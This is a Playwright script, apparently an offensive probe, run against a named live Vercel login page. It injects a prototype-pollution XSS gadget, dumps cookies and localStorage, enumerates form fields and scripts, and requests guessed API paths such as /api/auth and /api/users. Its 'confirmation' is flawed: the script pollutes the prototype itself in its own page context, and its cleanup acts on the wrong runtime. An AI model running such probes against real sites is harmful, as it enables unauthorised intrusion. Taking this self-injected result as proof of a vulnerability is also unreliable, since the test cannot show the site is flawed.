const { chromium } = require('playwright');

(async () => {
    console.log("=== Starting Playwright Test ===");
    
    // Launch browser
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Navigate to target
    console.log("Navigating to sturdy-octo...");
    await page.goto('https://sturdy-octo-memory-three.vercel.app/login');
    
    // Test 1: Confirm Prototype Pollution works
    console.log("\nTest 1: Confirming Prototype Pollution...");
    const ppTest = await page.evaluate(() => {
        Object.prototype.titan_test = "polluted";
        let test = {};
        return test.titan_test === "polluted";
    });
    console.log("PP works:", ppTest);
    
    // Test 2: Pollute children and test gadget
    console.log("\nTest 2: Testing XSS gadget...");
    const xssResult = await page.evaluate(() => {
        return new Promise((resolve) => {
            let resolved = false;
            window.alert = (msg) => {
                if (!resolved) { resolved = true; resolve(msg); }
            };
            
            Object.prototype.children = "alert('PP_XSS')";
            
            let o = document.createElement("script");
            let r = {};
            o.innerHTML = r.children;
            document.head.appendChild(o);
            
            setTimeout(() => {
                if (!resolved) { resolved = true; resolve('No alert fired'); }
            }, 1000);
        });
    });
    console.log("XSS Result:", xssResult);
    
    // Test 3: Get cookies
    console.log("\nTest 3: Getting cookies...");
    const cookies = await page.evaluate(() => document.cookie);
    console.log("Cookies:", cookies || "EMPTY");
    
    // Test 4: Get localStorage
    console.log("\nTest 4: Getting localStorage...");
    const localStorage = await page.evaluate(() => JSON.stringify(localStorage));
    console.log("LocalStorage:", localStorage);
    
    // Test 5: Get form details
    console.log("\nTest 5: Getting form details...");
    const formDetails = await page.evaluate(() => {
        let f = document.querySelector('form');
        if (f) {
            return {
                action: f.action,
                method: f.method,
                inputs: [...f.querySelectorAll('input')].map(i => ({
                    name: i.name,
                    type: i.type,
                    placeholder: i.placeholder
                }))
            };
        }
        return null;
    });
    console.log("Form:", JSON.stringify(formDetails, null, 2));
    
    // Test 6: Get all scripts
    console.log("\nTest 6: Getting all scripts...");
    const scripts = await page.evaluate(() => {
        return [...document.querySelectorAll('script[src]')].map(s => s.src);
    });
    console.log("Scripts:", scripts);
    
    // Test 7: Try API endpoints
    console.log("\nTest 7: Trying API endpoints...");
    const apiEndpoints = ['/api', '/api/auth', '/api/users', '/api/login', '/api/products'];
    for (const endpoint of apiEndpoints) {
        try {
            const response = await page.evaluate(async (url) => {
                const res = await fetch(url);
                return { status: res.status, statusText: res.statusText };
            }, endpoint);
            console.log(`${endpoint}: ${response.status} ${response.statusText}`);
        } catch (e) {
            console.log(`${endpoint}: ERROR - ${e.message}`);
        }
    }
    
    // Test 8: Get meta tags
    console.log("\nTest 8: Getting meta tags...");
    const metaTags = await page.evaluate(() => {
        return [...document.querySelectorAll('meta')].map(m => ({
            name: m.name,
            content: m.content
        }));
    });
    console.log("Meta tags:", metaTags);
    
    // Test 9: Get page title
    console.log("\nTest 9: Getting page title...");
    const title = await page.title();
    console.log("Title:", title);
    
    // Test 10: Get all links
    console.log("\nTest 10: Getting all links...");
    const links = await page.evaluate(() => {
        return [...document.querySelectorAll('a')].map(a => a.href);
    });
    console.log("Links:", links);
    
    // Close browser
    await browser.close();
    
    // Cleanup: Remove polluted properties
    delete Object.prototype.titan_test;
    delete Object.prototype.children;
    
    console.log("\n=== Test Complete ===");
})();
